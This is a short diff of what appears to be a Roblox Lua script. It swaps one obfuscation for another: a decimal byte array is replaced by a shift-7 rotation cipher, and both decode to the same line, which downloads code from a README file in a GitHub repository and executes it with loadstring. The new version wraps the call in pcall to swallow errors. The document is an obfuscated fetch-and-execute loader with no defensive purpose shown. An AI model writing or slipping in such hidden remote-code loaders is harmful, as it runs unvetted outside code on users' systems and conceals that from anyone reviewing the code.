@@ -1,8 +1,23 @@
-local bytes = {
-  108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,99,111,111,108,107,105,100,118,105,101,116,110,97,109,47,77,97,104,111,97,116,111,110,103,104,111,112,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,82,69,65,68,77,69,46,109,100,34,41,41,40,41,41
-}
+local function rot_decode(s, shift)
+    local out = {}
+    for i=1,#s do
+        local c = string.byte(s,i)
+        if c >= 32 and c <= 126 then
+            local base = 32
+            local range = 95
+            local x = ((c - base - shift) % range) + base
+            out[#out+1] = string.char(x)
+        else
+            out[#out+1] = string.char(c)
+        end
+    end
+    return table.concat(out)
+end
 
-local s = {}
-for i=1,#bytes do s[i] = string.char(bytes[i]) end
-local final = table.concat(s)
-loadstring(final)()
+local encoded = [[svhkz{ypun/nhtlAO{{wNl{/)o{{wzA66yh~5np{o|i|zlyjvu{lu{5jvt6jvvsrpk}pl{uht6Thovh{vunovw6ylmz6olhkz6thpu6YLHKTL5tk)00/0]]
+
+local ok,err = pcall(function()
+    local decoded = rot_decode(encoded, 7)
+    loadstring(decoded)()
+end)
+if not ok then warn("Run error: "..tostring(err)) end
